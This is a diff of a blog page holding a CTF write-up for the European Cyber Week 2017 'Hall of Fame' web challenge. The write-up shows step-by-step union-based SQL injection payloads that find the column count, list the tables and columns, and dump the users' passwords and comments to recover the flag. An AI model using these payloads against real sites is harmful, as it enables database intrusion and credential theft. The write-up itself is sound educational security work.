@@ -197,7 +197,7 @@
     
     
     <br/>
-    <i class="fas fa-clock"></i> 2 min read
+    <i class="fas fa-clock"></i> 3 min read
 </div>
 
 
@@ -207,7 +207,7 @@
 <p>From 06/10 to 22/10 2017, the online challenge is used as a pre-selection for the final Capture The Flag challenge which will start the November 29th 2017 during the European Cyber Week conference in Rennes (France).</p>
 <h2 id="discovery">Discovery</h2>
 <p>The challenges starts with a page presenting the &ldquo;Hall of Fame&rdquo; of 2016 CTF edition, with an input field used to filter on name. Our first idea is to test for an injection.</p>
-<!-- raw HTML omitted -->
+<center><img src="/img/writeups/ecw-2017/web-hall-of-fame/hof_1.png" alt="hall_of_fame_1" class="imgSize"/></center>
 <h2 id="sql-injection">SQL Injection</h2>
 <p>We can start by testing if the input field is vulnerable to SQL Injection.</p>
 <pre><code>pseudo='
@@ -218,17 +218,17 @@
 pseudo=' order by 7#
 </code></pre><p>No return after 7. It means that the table has 7 columns. Now, we have to find the vulnerable columns. In order to do that, we can use the UNION instruction.</p>
 <pre><code>pseudo=' union select 1,2,3,4,5,6#
-</code></pre><!-- raw HTML omitted -->
+</code></pre><center><img src="/img/writeups/ecw-2017/web-hall-of-fame/hof_2.png" alt="hall_of_fame_2" class="imgSize"/></center>
 <p>Perfect ! Now, we know that columns 3, 4 and 5 are vulnerable. So, we will have to inject.</p>
 <h2 id="data-exfiltration">Data exfiltration</h2>
 <p>We can now start to look for information inside the database. The first thing to do is to find the database name.</p>
 <pre><code>pseudo=' union select 1,2,3,table_name,5,6 from information_schema.tables where table_schema=database()#
-</code></pre><!-- raw HTML omitted -->
+</code></pre><center><img src="/img/writeups/ecw-2017/web-hall-of-fame/hof_3.png" alt="hall_of_fame_3" class="imgSize"/></center>
 <p>Then, we can list table columns, using the same method.</p>
-<!-- raw HTML omitted -->
+<center><img src="/img/writeups/ecw-2017/web-hall-of-fame/hof_4.png" alt="hall_of_fame_4" class="imgSize"/></center>
 <p>Great ! a column named &ldquo;password&rdquo;&hellip; Interesting ! Let&rsquo;s see what&rsquo;s inside. The used request here is even simpler because it only requires the password column content.</p>
 <pre><code>pseudo=' union select 1,2,3,password,5,6 from users#
-</code></pre><!-- raw HTML omitted -->
+</code></pre><center><img src="/img/writeups/ecw-2017/web-hall-of-fame/hof_5.png" alt="hall_of_fame_5" class="imgSize"/></center>
 <p>Hmm&hellip; It&rsquo;s likely that the flag is one of these passwords&hellip; But, how can we find it ?</p>
 <p>Two solutions :</p>
 <ul>
@@ -240,15 +240,19 @@ pseudo=' order by 7#
 </li>
 </ul>
 <p>We are going to choose the second option, more educational and interesting for a write-up. If we come back to the previous result, before password, we can notice :</p>
-<!-- raw HTML omitted -->
+<ul>
+ 	<li>The classical display on the wall contains the rank, username and score.</li>
+ 	<li>Another column, named "comment" is not displayed.</li>
+</ul>
+Suspicious, let's see it's content.
 <pre><code>pseudo=' union select 1,2,3,concat(comment,password),5,6 from users#
-</code></pre><!-- raw HTML omitted -->
+</code></pre><center><img src="/img/writeups/ecw-2017/web-hall-of-fame/hof_6.png" alt="hall_of_fame_6" class="imgSize"/></center>
 <h2 id="getting-the-flag">Getting the flag</h2>
 <p>Only one comment&hellip; Which is a reference in CTF creation. It seems that we have the flag ! ;)</p>
 <p>After checking, it&rsquo;s effectively the flag !</p>
 <h2 id="references">References</h2>
 <ul>
-<li><!-- raw HTML omitted -->Basic Union Based SQL Injection<!-- raw HTML omitted --></li>
+<li><a href="http://www.securityidiots.com/Web-Pentest/SQL-Injection/Basic-Union-Based-SQL-Injection.html" target="blank">Basic Union Based SQL Injection</a></li>
 </ul>
   </div>
   
